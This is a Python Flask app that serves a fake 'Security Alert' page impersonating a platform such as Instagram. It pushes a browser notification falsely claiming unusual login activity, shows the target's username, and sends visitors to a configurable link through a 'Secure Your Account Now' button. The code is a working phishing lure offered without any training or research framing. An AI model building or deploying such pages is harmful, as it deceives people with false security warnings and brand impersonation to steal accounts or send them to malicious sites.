#!/usr/bin/env python3
from flask import Flask, render_template_string, request, redirect, send_from_directory
import json
import os

app = Flask(__name__)

# Load notification data
def load_notification_data():
    try:
        with open('notification_data.json', 'r') as f:
            return json.load(f)
    except:
        return {
            'platform': 'Instagram',
            'username': 'test_user',
            'redirect_url': 'https://example.com',
            'icon_url': '/icons/instagram.png'
        }

@app.route('/')
def index():
    data = load_notification_data()
    
    html_template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Security Alert - {{ data.platform }}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: #fff;
                text-align: center;
                padding: 20px;
                margin: 0;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .notification {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 20px;
                margin: 20px auto;
                max-width: 400px;
                border: 1px solid rgba(255, 255, 255, 0.2);
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            .icon {
                width: 80px;
                height: 80px;
                border-radius: 20px;
                margin-bottom: 20px;
                border: 3px solid #fff;
            }
            .btn {
                background: linear-gradient(45deg, #FF416C, #FF4B2B);
                color: white;
                padding: 15px 30px;
                border: none;
                border-radius: 25px;
                cursor: pointer;
                margin: 15px 0;
                font-size: 16px;
                font-weight: bold;
                width: 100%;
                transition: all 0.3s ease;
            }
            .btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
            }
            .alert-badge {
                background: #ff4757;
                color: white;
                padding: 5px 15px;
                border-radius: 15px;
                font-size: 14px;
                margin-bottom: 15px;
                display: inline-block;
            }
        </style>
        <script>
            function showNotification() {
                if('Notification' in window) {
                    Notification.requestPermission().then(permission => {
                        if(permission === 'granted') {
                            new Notification('{{ data.platform }} Security Alert ⚠️', {
                                body: '{{ data.username }}, we detected unusual login activity. Secure your account now.',
                                icon: '{{ data.icon_url }}',
                                requireInteraction: true
                            });
                        }
                    });
                }
            }
            window.onload = showNotification;
        </script>
    </head>
    <body>
        <div class="notification">
            <img src="{{ data.icon_url }}" class="icon" alt="{{ data.platform }} Icon">
            <div class="alert-badge">⚠️ SECURITY ALERT</div>
            <h2>{{ data.platform }} Security Alert ⚠️</h2>
            <p style="font-size: 16px; line-height: 1.5; margin: 20px 0;">
                {{ data.username }}, we detected unusual login activity from a new device. 
                Your account may be at risk. Secure it now to prevent unauthorized access.
            </p>
            <button class="btn" onclick="window.location.href='{{ data.redirect_url }}'">
                🔐 Secure Your Account Now
            </button>
            <p style="font-size: 12px; opacity: 0.8; margin-top: 15px;">
                Click the button above to protect your account immediately
            </p>
        </div>
    </body>
    </html>
    """
    
    return render_template_string(html_template, data=data)

@app.route('/icons/<filename>')
def serve_icon(filename):
    return send_from_directory('icons', filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
